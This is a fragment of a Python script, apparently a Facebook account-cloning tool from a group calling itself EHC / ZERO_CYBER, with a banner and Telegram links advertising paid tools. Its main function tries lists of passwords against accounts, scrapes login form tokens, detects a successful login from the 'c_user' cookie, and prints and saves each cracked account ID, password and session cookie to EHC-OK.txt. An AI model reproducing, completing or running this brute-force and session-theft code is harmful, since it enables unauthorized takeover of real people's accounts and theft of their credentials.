...
os.system('xdg-open https://t.me/ZERO_CYBER_TEM')
os.system('xdg-open https://t.me/ZERO_CYBER_TEM')
print('\n\033[1;36m[✓]   WELCOME TO EHC BY ZEROTOOL');time.sleep(3)
...
#---------------logo----------------#
logo =("""                
EHC BANGLADESH EMRAN CYBER
FROM BANGLADRLESH WORKING
PYTHON TERMUX KALI LUNUX pHP THML
bAST COMMAND PAID
SEND TG : https://t.me/ZERO_CYBER_TEM
\033[38;5;46m=================================""")                                                                                                                                                   
def linex():
          print(f'{warna}======================================================{B}')
#------------------clear def---------------#
...
def AFG_CLONING():
    ...
    print(46*'-')
    print('IDZ SAVED IN OK.txt : OK.txt')
    print(46*'-')
        ...
        for ps in pwx:
          ...
          "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[38;5;46m[EHC-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[38;5;46m'+coki+  '  ''  \033[0;97m')
                linex()
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[38;5;46m[EHC-OK] '+uid+' | '+ps+'\x1b[1;97m')
                open('EHC-OK.txt', 'a').write(uid+' | '+ps+'\n')
                OKs.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;96m[EHC-TEAM]\033[38;5;46m] %s|\033[38;5;46m[EMRAN]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
